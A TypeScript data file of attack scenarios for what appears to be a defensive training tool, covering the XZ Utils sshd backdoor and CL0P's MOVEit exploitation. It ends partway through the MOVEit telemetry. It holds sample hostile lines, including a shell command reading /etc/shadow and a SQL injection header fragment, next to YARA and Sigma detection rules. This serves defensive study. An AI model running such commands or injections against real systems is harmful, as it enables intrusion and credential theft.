import { AttackScenario } from './types';

/**
 * ============================================================================
 * AUTHORITATIVE APT & ZERO-DAY SCENARIOS — BATCH 1 (SUPPLY CHAIN, LINUX & MFT)
 * ============================================================================
 * Multi-Source Verified Scenarios:
 * 1. XZ Utils Supply Chain Backdoor (CVE-2024-3094) — Andres Freund, Red Hat, Kaspersky GReAT, CISA
 * 2. CL0P MOVEit Transfer SQLi & LEMURLOOT (CVE-2023-34362) — Mandiant, Huntress, CISA AA23-158A, Rapid7
 * 3. OpenSSH regreSSHion SIGALRM Race RCE (CVE-2024-6387) — Qualys TRU, OpenSSH, CISA
 * 4. Fortra GoAnywhere MFT Deserialization (CVE-2023-0669) — Huntress, Mandiant, Horizon3.ai, CISA
 * 5. 3CXDesktopApp Supply Chain (CVE-2023-29059 / SmoothOperator) — CrowdStrike, Kaspersky GReAT, Mandiant
 */

export const XZ_UTILS_CVE_2024_3094_BACKDOOR_SCENARIO: AttackScenario = {
  id: 'xz-utils-cve-2024-3094-backdoor',
  code: 'CVE-2024-3094',
  name: 'Andres Freund, Red Hat & Kaspersky — XZ Utils (liblzma) IFUNC sshd Supply Chain Backdoor',
  shortSubtitle: 'Andres Freund · Kaspersky GReAT · Red Hat · liblzma.so.5.6.1 IFUNC & RSA_public_decrypt Hook',
  category: 'MALWARE',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Discovered by Microsoft engineer Andres Freund and reverse-engineered by Kaspersky GReAT, Red Hat, and CISA (March 2024), CVE-2024-3094 (CVSS 10.0) is a multi-year supply chain backdoor implanted by the persona "Jia Tan" into XZ Utils 5.6.0 and 5.6.1. During package compilation, obfuscated m4 macro scripts extract a prebuilt object file (liblzma_la-crc64-fast.o) from corrupt test archives (bad-3-corrupt_lzma2.xz). On systemd-enabled Linux distributions where OpenSSH (sshd) loads libsystemd.so.0 -> liblzma.so.5, a glibc IFUNC resolver (_get_cpuid) hijacks the Global Offset Table entry for RSA_public_decrypt, verifying an Ed448-signed payload in the client SSH certificate to execute arbitrary root commands via system() before authentication completes.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Andres Freund (oss-security) · Kaspersky GReAT · Red Hat & CISA CVE-2024-3094',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1195.002 (Supply Chain Software) · T1574.006 (Dynamic Linker Hijacking) · T1556 (Modify Auth)',
    },
    {
      term: 'BACKDOOR ARTIFACT',
      value: 'liblzma.so.5.6.1 (liblzma_la-crc64-fast.o extracted from bad-3-corrupt_lzma2.xz)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: '/usr/sbin/sshd -> libsystemd.so.0 -> liblzma.so.5.6.1 (RSA_public_decrypt GOT Hook)',
    },
  ],
  nodes: [
    {
      id: 'jiatan_ssh_operator',
      label: 'Jia Tan / APT Operator',
      sublabel: '198.51.100.214 (Ed448 SSH Client)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary SSH Client (Ed448 Private Key Holder)',
        pidOrPort: 'TCP :22 (SSH-2.0 Certificate / RSA Modulus Payload)',
        privilege: 'Unauthenticated Pre-Auth SSH Client',
        artifacts: [
          'SSH_MSG_USERAUTH_REQUEST (Ed448 signed N value in RSA modulus)',
          'tests/files/bad-3-corrupt_lzma2.xz & good-large_compressed.lzma',
        ],
        description:
          'Upstream threat actor sending a crafted SSH public-key authentication packet whose RSA modulus N embeds an Ed448-signed ChaCha20 command payload.',
      },
    },
    {
      id: 'linux_sshd_host',
      label: 'Linux Server (sshd :22)',
      sublabel: '10.20.10.14 (systemd + liblzma 5.6.1)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Linux Server (glibc + systemd notification patch)',
        pidOrPort: 'PID 1142 (/usr/sbin/sshd -D)',
        privilege: 'root (UID 0)',
        artifacts: [
          '/lib/x86_64-linux-gnu/liblzma.so.5.6.1',
          '/lib/x86_64-linux-gnu/libsystemd.so.0',
        ],
        description:
          'OpenSSH daemon linked with libsystemd.so.0 for sd_notify readiness, causing transitive loading of the trojanized liblzma.so.5.6.1 library into sshd.',
      },
    },
    {
      id: 'liblzma_ifunc_hook',
      label: 'liblzma IFUNC & GOT Hook',
      sublabel: 'crc64_resolve -> RSA_public_decrypt',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'glibc Indirect Function (IFUNC) & ld.so Audit Hook',
        pidOrPort: 'PID 4918 (sshd [priv] child)',
        privilege: 'root (Pre-Privilege Separation)',
        artifacts: [
          '_get_cpuid() in liblzma_la-crc64-fast.o',
          'GOT hook: RSA_public_decrypt -> Ed448 verifier -> system()',
        ],
        description:
          'During dynamic symbol resolution before main(), crc64_resolve invokes _get_cpuid() to hook _dl_audit_preinit and redirect OpenSSL RSA_public_decrypt.',
      },
    },
    {
      id: 'root_shell_execution',
      label: 'Pre-Auth Root Command Exec',
      sublabel: 'system() inside sshd [priv]',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Linux Root Execution Context (UID 0)',
        pidOrPort: '/bin/sh -c <decrypted Ed448 payload>',
        privilege: 'root (UID 0, GID 0) — Zero Auth Log',
        artifacts: [
          'ChaCha20-decrypted command buffer',
          'Bypassed sshd audit_event(SSH_AUTH_FAIL)',
        ],
        description:
          'When Ed448 signature verification succeeds against the hardcoded 32-byte public key, the backdoor executes system() as root prior to SSH authentication logging.',
      },
    },
    {
      id: 'linux_edr_siem',
      label: 'Linux Auditd & eBPF SIEM',
      sublabel: 'Perf / Valgrind / YARA Detector',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Linux eBPF Telemetry & YARA Scanner',
        pidOrPort: 'Auditd EXECVE & liblzma Hash Monitor',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'CISA / Kaspersky YARA: Bkdr_XZ_Utils_CVE_2024_3094',
          'sshd CPU cycle spike (~500ms) & unexpected /bin/sh child of sshd',
        ],
        description:
          'Detects liblzma.so.5.6.0/5.6.1 SHA-256 hashes, sshd spawning /bin/sh before USER_AUTH completion, and IFUNC symbol redirection.',
      },
    },
  ],
  processTree: [
    {
      pid: 1142,
      ppid: 1,
      name: 'sshd (listener)',
      commandLine: 'sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'normal',
      activeFromStage: 1,
      apiCalls: ['dlopen("libsystemd.so.0")', 'dlopen("liblzma.so.5.6.1")'],
    },
    {
      pid: 4918,
      ppid: 1142,
      name: 'sshd [priv] (IFUNC Hooked)',
      commandLine: 'sshd: root [priv]',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'crc64_resolve()',
        '_get_cpuid()',
        'RSA_public_decrypt(flen, from, to, rsa, padding)',
        'EVP_PKEY_verify(Ed448)',
      ],
      memoryBlocks: [
        {
          address: '0x00007F8A2C009400',
          section: 'liblzma.so.5.6.1 (.text.crc64_resolve)',
          permissions: 'R-X',
          size: '88 KB',
          status: 'injected',
          description:
            'Malicious liblzma_la-crc64-fast.o object injected at build time, redirecting RSA_public_decrypt via glibc IFUNC.',
          hexPreview: 'F3 0F 1E FA 48 83 EC 08 E8 1F 02 00 00 48 8D 05 (crc64_resolve -> _get_cpuid)',
        },
      ],
    },
    {
      pid: 4925,
      ppid: 4918,
      name: 'sh (Pre-Auth RCE)',
      commandLine: '/bin/sh -c id; cat /etc/shadow',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['fork()', 'execve("/bin/sh")', 'exit(0)'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'M4 BUILD-TIME EXTRACTION & TRANSITIVE LIBSYSTEMD LOAD',
      subtitle: 'Extracting liblzma_la-crc64-fast.o from bad-3-corrupt_lzma2.xz into liblzma.so.5.6.1',
      description:
        'During the build of xz-utils 5.6.0/5.6.1, a modified build-to-host.m4 script decodes hidden shell stages from tests/files/bad-3-corrupt_lzma2.xz and tests/files/good-large_compressed.lzma, splicing a precompiled backdoor object into liblzma_la-crc64-fast.o. On systemd-based Linux systems, /usr/sbin/sshd links against libsystemd.so.0, which transitively loads the poisoned liblzma.so.5.6.1 into every sshd process.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1195.002',
      mitreTechniqueName: 'Supply Chain Compromise: Compromise Software Supply Chain',
      activeNodeIds: ['jiatan_ssh_operator', 'linux_sshd_host', 'linux_edr_siem'],
      compromisedNodeIds: ['linux_sshd_host'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2024-3094 (CVSS 10.0 Supply Chain Backdoor)' },
        { term: 'TROJANIZED FILES', value: 'build-to-host.m4 & tests/files/bad-3-corrupt_lzma2.xz' },
        { term: 'TRANSITIVE LINK', value: '/usr/sbin/sshd -> libsystemd.so.0 -> liblzma.so.5.6.1' },
      ],
    },
    {
      index: 2,
      title: 'GLIBC IFUNC RESOLVER & RSA_PUBLIC_DECRYPT GOT HIJACK',
      subtitle: 'crc64_resolve() executes before main() to hook OpenSSL RSA_public_decrypt',
      description:
        'Before sshd even enters main(), the GNU dynamic linker (ld-linux-x86-64.so.2) resolves C-library Indirect Functions (IFUNC). When liblzma resolves crc64_resolve(), the injected _get_cpuid() routine checks that process argv[0] is "/usr/sbin/sshd" and that TERM/LD_DEBUG env vars are absent, then hooks _dl_audit_preinit to overwrite the Global Offset Table (GOT) pointer for OpenSSL’s RSA_public_decrypt.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1574.006',
      mitreTechniqueName: 'Hijack Execution Flow: Dynamic Linker Hijacking',
      activeNodeIds: ['linux_sshd_host', 'liblzma_ifunc_hook', 'linux_edr_siem'],
      compromisedNodeIds: ['linux_sshd_host', 'liblzma_ifunc_hook'],
      keySpecs: [
        { term: 'IFUNC ENTRYPOINT', value: 'crc64_resolve() -> _get_cpuid() in liblzma_la-crc64-fast.o' },
        { term: 'ENV EVASION CHECK', value: 'argv[0] == "/usr/sbin/sshd" && !LD_DEBUG && !LD_PROFILE' },
        { term: 'HOOKED SYMBOL', value: 'RSA_public_decrypt@plt (OpenSSL libcrypto)' },
      ],
    },
    {
      index: 3,
      title: 'ED448 SSH CERTIFICATE VERIFICATION & PRE-AUTH SYSTEM() RCE',
      subtitle: 'Decrypting ChaCha20 command payload inside RSA modulus N and executing as root',
      description:
        'When the threat actor connects over TCP/22 and sends an SSH public-key authentication request, sshd calls the hooked RSA_public_decrypt(). The backdoor inspects the first 16 bytes of the RSA modulus N for a magic header (a*b + c <= 3), decrypts the embedded payload using ChaCha20 derived from a hardcoded Ed448 public key, verifies the attacker’s Ed448 cryptographic signature, and passes the command string directly to system() as root.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1556',
      mitreTechniqueName: 'Modify Authentication Process',
      activeNodeIds: ['jiatan_ssh_operator', 'liblzma_ifunc_hook', 'root_shell_execution', 'linux_edr_siem'],
      compromisedNodeIds: ['linux_sshd_host', 'liblzma_ifunc_hook', 'root_shell_execution'],
      keySpecs: [
        { term: 'CRYPTOGRAPHIC GATE', value: 'Ed448 Signature Verification + ChaCha20 Stream Cipher' },
        { term: 'PAYLOAD CARRIER', value: 'SSH RSA Certificate / Public Key Modulus (N)' },
        { term: 'EXECUTION PRIMITIVE', value: 'system() as uid=0(root) inside privileged sshd monitor' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'xz-3094-1',
      no: 1,
      stageIndex: 1,
      timestamp: '09:12:04.115',
      sourceNodeId: 'jiatan_ssh_operator',
      targetNodeId: 'linux_sshd_host',
      sourceLabel: 'xz-5.6.1 Build / systemd',
      targetLabel: '/usr/sbin/sshd',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'ldd / ELF DT_NEEDED',
      shortAction: 'LIBLZMA 5.6.1 LOAD',
      info: '/usr/sbin/sshd loads libsystemd.so.0 -> /lib/x86_64-linux-gnu/liblzma.so.5.6.1 (CVE-2024-3094)',
      sizeOrCode: 'liblzma 5.6.1',
      severity: 'CRITICAL',
      mitreId: 'T1195.002',
      explanation:
        'Andres Freund discovered that systemd-patched sshd loads liblzma.so.5.6.1, which contains the obfuscated object extracted from bad-3-corrupt_lzma2.xz during the m4 build stage.',
      rawLog: `$ ldd /usr/sbin/sshd | grep -E "libsystemd|liblzma"
  libsystemd.so.0 => /lib/x86_64-linux-gnu/libsystemd.so.0 (0x00007f8a2c050000)
  liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5.6.1 (0x00007f8a2c000000)
[BUILD_ARTIFACT] m4/build-to-host.m4 -> tr "\\t \\-" " \\t_" < tests/files/bad-3-corrupt_lzma2.xz | xz -dc -> liblzma_la-crc64-fast.o`,
      detectionRule: {
        type: 'YARA',
        title: 'Kaspersky / CISA YARA — XZ Utils CVE-2024-3094 Backdoored liblzma.so.5.6.0/5.6.1',
        ruleCode: `rule Bkdr_Linux_XZUtils_CVE_2024_3094 {
  meta:
    author = "Kaspersky GReAT / CISA / Florian Roth"
    cve = "CVE-2024-3094"
  strings:
    $op = { f3 0f 1e fa 48 85 ff 0f 84 ?? ?? 00 00 41 54 55 53 48 89 f3 }
  condition:
    uint32(0) == 0x464c457f and $op
}`,
        mitigation:
          'Immediately downgrade xz-utils / liblzma5 to version 5.4.x or upgrade to clean upstream 5.6.2+, and restart sshd.',
      },
    },
    {
      id: 'xz-3094-2',
      no: 2,
      stageIndex: 2,
      timestamp: '09:12:04.618',
      sourceNodeId: 'linux_sshd_host',
      targetNodeId: 'liblzma_ifunc_hook',
      sourceLabel: 'ld-linux-x86-64.so.2',
      targetLabel: 'RSA_public_decrypt@GOT',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'ELF IFUNC Resolver',
      shortAction: 'IFUNC GOT HOOK',
      info: 'crc64_resolve() -> _get_cpuid() hijacks RSA_public_decrypt in sshd [priv] (+500ms CPU instructions)',
      sizeOrCode: '+2.3B Cycles',
      severity: 'CRITICAL',
      mitreId: 'T1574.006',
      explanation:
        'During ELF startup before main(), the IFUNC resolver in liblzma parses symbol tables in memory (causing the ~500ms CPU spike noticed by Andres Freund) and hooks RSA_public_decrypt.',
      rawLog: `[PERF_PROFILE] process="/usr/sbin/sshd" pid=4918 comm="sshd"
cycles=2,314,892,104 delta_time_ms=512.4
callchain: ld-linux-x86-64.so.2!_dl_relocate_object -> liblzma.so.5.6.1!crc64_resolve -> _get_cpuid -> _dl_audit_preinit
[GOT_REDIRECT] symbol="RSA_public_decrypt" old_addr=0x7f8a2b914220 (libcrypto.so.3) new_addr=0x7f8a2c00a8c0 (liblzma.so.5.6.1)`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Linux OpenSSH Server Loading Vulnerable liblzma 5.6.0 / 5.6.1',
        ruleCode: `title: XZ Utils CVE-2024-3094 Vulnerable liblzma Loaded by sshd
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: '/sshd'
  condition: selection
level: critical`,
        mitigation:
          'Audit loaded shared libraries inside running sshd processes via lsof -p $(pidof sshd) | grep liblzma.so.5.6.',
      },
    },
    {
      id: 'xz-3094-3',
      no: 3,
      stageIndex: 3,
      timestamp: '09:12:05.042',
      sourceNodeId: 'liblzma_ifunc_hook',
      targetNodeId: 'root_shell_execution',
      sourceLabel: 'sshd [priv] (PID 4918)',
      targetLabel: '/bin/sh -c (UID 0)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'Auditd SYSCALL 59',
      shortAction: 'PRE-AUTH ROOT RCE',
      info: 'RSA_public_decrypt verifies Ed448 payload in RSA modulus N and invokes system() as root',
      sizeOrCode: 'UID 0 (root)',
      severity: 'CRITICAL',
      mitreId: 'T1556',
      explanation:
        'Once the hooked RSA_public_decrypt validates the attacker’s Ed448 signature inside the SSH certificate modulus, it runs the embedded command via system() as root before authentication finishes.',
      rawLog: `type=SYSCALL msg=audit(1711703525.042:4192): arch=c000003e syscall=59 success=yes exit=0 ppid=4918 pid=4925 uid=0 gid=0 euid=0 comm="sh" exe="/usr/bin/dash"
type=EXECVE msg=audit(1711703525.042:4192): argc=3 a0="sh" a1="-c" a2="id; cat /etc/shadow"
[SSHD_STATE] Pre-authentication child (sshd: root [priv]) spawned /bin/sh prior to SSH_MSG_USERAUTH_SUCCESS`,
      detectionRule: {
        type: 'SIGMA',
        title: 'OpenSSH Pre-Auth Privileged Monitor Spawning Unexpected Shell (CVE-2024-3094)',
        ruleCode: `title: OpenSSH sshd Spawning Shell During Pre-Auth Phase
logsource:
  product: linux
  service: auditd
detection:
  selection:
    ParentImage|endswith: '/sshd'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
  condition: selection
level: critical`,
        mitigation:
          'Monitor eBPF / Auditd for any execve(/bin/sh) child process spawned by the privileged unauthenticated sshd [priv] process.',
      },
    },
  ],
};

export const CL0P_MOVEIT_TRANSFER_CVE_2023_34362_SCENARIO: AttackScenario = {
  id: 'cl0p-moveit-transfer-cve-2023-34362',
  code: 'CVE-2023-34362',
  name: 'Mandiant, Huntress & CISA — CL0P (FIN11): MOVEit Transfer SQLi, ISAPI Deserialization & LEMURLOOT',
  shortSubtitle: 'Mandiant · Huntress · CISA AA23-158A · guestaccess.aspx, moveitisapi.dll & human2.aspx Webshell',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented by Mandiant (FIN11 / UNC4857), Huntress, Rapid7, and Joint CISA/FBI Advisory AA23-158A (May–June 2023), the CL0P ransomware syndicate mass-exploited CVE-2023-34362 in Progress MOVEit Transfer managed file transfer servers. By first requesting /guestaccess.aspx to poison an active session row in the MySQL/MSSQL database, and then sending crafted X-siLock-Step1 headers to /moveitisapi/moveitisapi.dll?action=m2, the attacker exploited a SQL injection flaw to inject a Base64-encoded .NET BinaryFormatter deserialization gadget—dropping the human2.aspx (LEMURLOOT) webshell into C:\\MOVEitTransfer\\wwwroot\\ to steal Azure Blob Storage keys and exfiltrate enterprise files.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Mandiant (LEMURLOOT / FIN11) · Huntress Labs · CISA/FBI Advisory AA23-158A · Rapid7',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit Public App) · T1505.003 (Web Shell: human2.aspx) · T1530 (Cloud Storage Exfil)',
    },
    {
      term: 'WEBSHELL ARTIFACT',
      value: 'LEMURLOOT (C:\\MOVEitTransfer\\wwwroot\\human2.aspx & X-siLock-Comment password)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: '/guestaccess.aspx -> /moveitisapi/moveitisapi.dll?action=m2 -> w3wp.exe spawning csc.exe',
    },
  ],
  nodes: [
    {
      id: 'cl0p_fin11_actor',
      label: 'CL0P / FIN11 Operator',
      sublabel: '198.51.100.89 (Automated Exploit Scanner)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Infrastructure (CL0P / Lace Tempest)',
        pidOrPort: 'HTTPS :443 -> /moveitisapi/moveitisapi.dll',
        privilege: 'Unauthenticated External',
        artifacts: [
          'POST /guestaccess.aspx (Session Poisoning)',
          'Header: X-siLock-Step1 / X-siLock-SessVar SQLi Payload',
        ],
        description:
          'CL0P operator chaining /guestaccess.aspx session creation with /moveitisapi/moveitisapi.dll SQL injection and .NET deserialization.',
      },
    },
    {
      id: 'moveit_iis_server',
      label: 'MOVEit Transfer IIS Server',
      sublabel: '172.16.20.18 (w3wp.exe + moveitisapi.dll)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Windows Server 2019 (IIS 10.0 + Progress MOVEit Transfer)',
        pidOrPort: 'PID 5412 (w3wp.exe -ap "moveitdmz Pool")',
        privilege: 'IIS APPPOOL\\moveitdmz',
        artifacts: [
          'C:\\MOVEitTransfer\\wwwroot\\moveitisapi\\moveitisapi.dll',
          'C:\\MOVEitTransfer\\wwwroot\\guestaccess.aspx',
        ],
        description:
          'Internet-facing MOVEit Transfer server where moveitisapi.dll passes unsanitized X-siLock headers to SILMachine2.aspx and database session tables.',
      },
    },
    {
      id: 'lemurloot_webshell',
      label: 'LEMURLOOT (human2.aspx)',
      sublabel: 'w3wp.exe -> csc.exe Dynamic Compile',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'ASP.NET Webshell (human2.aspx / LEMURLOOT)',
        pidOrPort: 'PID 5412 -> PID 8816 (csc.exe)',
        privilege: 'IIS APPPOOL\\moveitdmz',
        artifacts: [
          'C:\\MOVEitTransfer\\wwwroot\\human2.aspx',
          'HTTP Header: X-siLock-Comment (UUID authentication key)',
        ],
        description:
          'Custom C# webshell tracked by Mandiant as LEMURLOOT, protected by a hard-coded X-siLock-Comment header check and compiled by csc.exe.',
      },
    },
    {
      id: 'moveit_db_azure_blob',
      label: 'MOVEit SQL DB & Azure Blob',
      sublabel: 'moveittransfer DB & Azure Storage Keys',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'MySQL / MSSQL Backend & Azure Blob Storage',
        pidOrPort: 'files / institutions / users tables & Azure SAS Keys',
        privilege: 'Database & Cloud Storage Admin',
        artifacts: [
          'HKLM\\SOFTWARE\\Standard Networks\\siLock\\Institutions\\0\\Key',
          'AzureAccountName / AzureAccountKey & GZipStream exfiltration',
        ],
        description:
          'Database and cloud storage backend queried by LEMURLOOT to enumerate stored files, decrypt institution keys, and stream GZip archives to the attacker.',
      },
    },
    {
      id: 'soc_siem_edr',
      label: 'SOC SIEM & IIS Log Sensor',
      sublabel: 'Sysmon EID 1/11 & IIS W3SVC Logs',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Enterprise SIEM & Endpoint Detection',
        pidOrPort: 'IIS W3SVC1 + Sysmon EventID 1 (csc.exe) & 11 (human2.aspx)',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'CISA AA23-158A YARA & Sigma Rules',
          'w3wp.exe spawning csc.exe & writing human2.aspx',
        ],
        description:
          'Correlates rapid /guestaccess.aspx + /moveitisapi/moveitisapi.dll HTTP requests with w3wp.exe spawning csc.exe to compile human2.aspx.',
      },
    },
  ],
  processTree: [
    {
      pid: 5412,
      ppid: 1088,
      name: 'w3wp.exe (moveitdmz)',
      commandLine: 'c:\\windows\\system32\\inetsrv\\w3wp.exe -ap "moveitdmz Pool" -v "v4.0"',
      user: 'IIS APPPOOL\\moveitdmz',
      integrity: 'High',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['HttpExtensionProc(moveitisapi.dll)', 'BinaryFormatter.Deserialize()'],
    },
    {
      pid: 8816,
      ppid: 5412,
      name: 'csc.exe (ASP.NET Compiler)',
      commandLine:
        'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @"C:\\Windows\\Temp\\root\\human2.aspx.cmdline"',
      user: 'IIS APPPOOL\\moveitdmz',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: ['CreateFileW("App_Web_human2.aspx.dll")', 'WriteFile'],
    },
    {
      pid: 5412,
      ppid: 1088,
      name: 'human2.aspx (LEMURLOOT)',
      commandLine: 'GET /human2.aspx (Header: X-siLock-Comment: <UUID>)',
      user: 'IIS APPPOOL\\moveitdmz',
      integrity: 'High',
      status: 'injected',
      activeFromStage: 3,
      apiCalls: [
        'RegOpenKeyEx("SOFTWARE\\Standard Networks\\siLock")',
        'SqlCommand("SELECT * FROM files")',
        'GZipStream.Write()',
      ],
      memoryBlocks: [
        {
          address: '0x00007FF891A40000',
          section: 'App_Web_human2.aspx.dll (LEMURLOOT)',
          permissions: 'R-X',
          size: '64 KB',
          status: 'injected',
          description:
            'Compiled LEMURLOOT ASP.NET assembly reading X-siLock-Comment, X-siLock-Step1, X-siLock-Step2, and X-siLock-Step3 headers.',
          hexPreview: 'Request.Headers["X-siLock-Comment"] != "..." -> GZipStream(Response.OutputStream)',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'SESSION POISONING & MOVEITISAPI.DLL SQL INJECTION (CVE-2023-34362)',
      subtitle: 'Chaining /guestaccess.aspx with /moveitisapi/moveitisapi.dll X-siLock headers',
      description:
        'The attacker first requests /guestaccess.aspx and /api/v1/token to establish an unauthenticated guest session, then sends a crafted HTTPS request to /moveitisapi/moveitisapi.dll?action=m2 containing injected SQL statements inside X-siLock-SessVar headers. Because moveitisapi.dll forwards these headers to SILMachine2.aspx without parameterization, the attacker executes arbitrary SQL INSERT/UPDATE statements against the MOVEit database.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['cl0p_fin11_actor', 'moveit_iis_server', 'soc_siem_edr'],
      compromisedNodeIds: ['moveit_iis_server'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-34362 (Unauthenticated SQLi to RCE)' },
        { term: 'EXPLOIT ENDPOINTS', value: '/guestaccess.aspx & /moveitisapi/moveitisapi.dll?action=m2' },
        { term: 'TARGET PROCESS', value: 'w3wp.exe (IIS APPPOOL\\moveitdmz)' },
      ],
    },
    {
      index: 2,
      title: '.NET DESERIALIZATION & HUMAN2.ASPX (LEMURLOOT) WEBSHELL DROP',
      subtitle: 'Triggering BinaryFormatter deserialization and csc.exe compilation of human2.aspx',
      description:
        'Using the SQL injection primitive, the attacker inserts a Base64-encoded .NET BinaryFormatter gadget chain (WindowsIdentity / ClaimsPrincipal) into the database session state. When MOVEit Transfer reads and deserializes that session record, arbitrary .NET code executes inside w3wp.exe—writing the LEMURLOOT webshell to C:\\MOVEitTransfer\\wwwroot\\human2.aspx and triggering csc.exe to compile it.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1505.003',
      mitreTechniqueName: 'Server Software Component: Web Shell',
      activeNodeIds: ['moveit_iis_server', 'lemurloot_webshell', 'soc_siem_edr'],
      compromisedNodeIds: ['moveit_iis_server', 'lemurloot_webshell'],
      keySpecs: [
        { term: 'DESERIALIZATION', value: '.NET BinaryFormatter Session State Gadget Chain' },
        { term: 'WEBSHELL PATH', value: 'C:\\MOVEitTransfer\\wwwroot\\human2.aspx (LEMURLOOT)' },
        { term: 'COMPILER ARTIFACT', value: 'w3wp.exe -> csc.exe -> App_Web_human2.aspx.dll' },
      ],
    },
    {
      index: 3,
      title: 'AZURE BLOB CREDENTIAL THEFT & GZIP FILE EXFILTRATION',
      subtitle: 'Sending X-siLock-Comment headers to human2.aspx to dump files and cloud keys',
      description:
        'The attacker interacts with /human2.aspx by supplying a secret password in the X-siLock-Comment HTTP header and command codes in X-siLock-Step1 ("-1" to retrieve Azure Blob Storage settings, institution encryption keys from the Registry, and SQL file tables; "-2" to create or delete a rogue admin user named "HealthCheck Service"). Selected enterprise files are GZip-compressed and streamed directly over HTTPS.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1530',
      mitreTechniqueName: 'Data from Cloud Storage',
      activeNodeIds: ['cl0p_fin11_actor', 'lemurloot_webshell', 'moveit_db_azure_blob', 'soc_siem_edr'],
      compromisedNodeIds: ['moveit_iis_server', 'lemurloot_webshell', 'moveit_db_azure_blob'],
      keySpecs: [
        { term: 'AUTH HEADER', value: 'X-siLock-Comment: <36-char UUID password>' },
        { term: 'COMMAND HEADERS', value: 'X-siLock-Step1: -1 (Exfil DB/Azure) | -2 (Delete Admin)' },
        { term: 'STOLEN SECRETS', value: 'AzureAccountName, AzureAccountKey & Institution Master Keys' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'moveit-34362-1',
      no: 1,
      stageIndex: 1,
      timestamp: '02:41:10.104',
      sourceNodeId: 'cl0p_fin11_actor',
      targetNodeId: 'moveit_iis_server',
      sourceLabel: '198.51.100.89',
      targetLabel: 'IIS :443 (moveitisapi.dll)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'IIS W3SVC HTTP POST',
      shortAction: 'ISAPI SQL INJECTION',
      info: 'POST /guestaccess.aspx followed by /moveitisapi/moveitisapi.dll?action=m2 (CVE-2023-34362)',
      sizeOrCode: 'HTTP 200',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Huntress and Mandiant documented the signature three-step HTTP sequence in IIS logs: POST /api/v1/token, GET/POST /guestaccess.aspx, and POST /moveitisapi/moveitisapi.dll?action=m2.',
      rawLog: `2023-05-30 02:41:09 172.16.20.18 POST /guestaccess.aspx - 443 - 198.51.100.89 Mozilla/5.0 200 0 0 42
2023-05-30 02:41:10 172.16.20.18 POST /moveitisapi/moveitisapi.dll action=m2 443 - 198.51.100.89 Mozilla/5.0 200 0 0 118
[HTTP_HEADERS] X-siLock-Transaction: folder_add_by_path
X-siLock-SessVar1: '; INSERT INTO activesessions ...`,
      detectionRule: {
        type: 'SIGMA',
        title: 'MOVEit Transfer CVE-2023-34362 Exploitation via moveitisapi.dll & human2.aspx',
        ruleCode: `title: Progress MOVEit Transfer CVE-2023-34362 Web Exploit
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains:
      - '/moveitisapi/moveitisapi.dll'
      - '/human2.aspx'
  condition: selection
level: critical`,
        mitigation:
          'Disable HTTP/HTTPS traffic to MOVEit Transfer immediately, apply Progress Software security patches, and audit C:\\MOVEitTransfer\\wwwroot\\ for unauthorized .aspx files.',
      },
    },
    {
      id: 'moveit-34362-2',
      no: 2,
      stageIndex: 2,
      timestamp: '02:41:12.482',
      sourceNodeId: 'moveit_iis_server',
      targetNodeId: 'lemurloot_webshell',
      sourceLabel: 'w3wp.exe (PID 5412)',
      targetLabel: 'csc.exe / human2.aspx',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1 & 11',
      shortAction: 'DROP HUMAN2.ASPX',
